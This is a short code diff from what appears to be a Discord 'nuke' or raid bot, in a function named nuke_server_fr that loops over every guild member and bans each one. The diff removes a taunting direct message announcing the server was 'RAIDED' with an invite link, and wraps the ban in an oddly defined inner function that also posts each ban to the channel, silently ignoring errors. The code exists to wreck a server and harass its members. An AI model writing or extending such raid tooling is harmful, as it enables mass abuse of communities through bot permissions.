@@ -200,9 +200,10 @@ async def nuke_server_fr(ctx):
 
         for member in all_members_list:
             try:
-                await member.send(f'GG Noob! One of your servers {guild.name} got RAIDED and you were BANNED '
-                                  f'lol\nJoin https://discord.gg/uAsCWzkNZd')
-                await member.ban()
+                async def ban(self, *, member: discord.Member, reason=None):
+                    await member.ban(reason=reason)
+                    await ctx.send(f'User: `{member}` has been banned')
+                await ban('', member=member)
             except:
                 None
             finally:
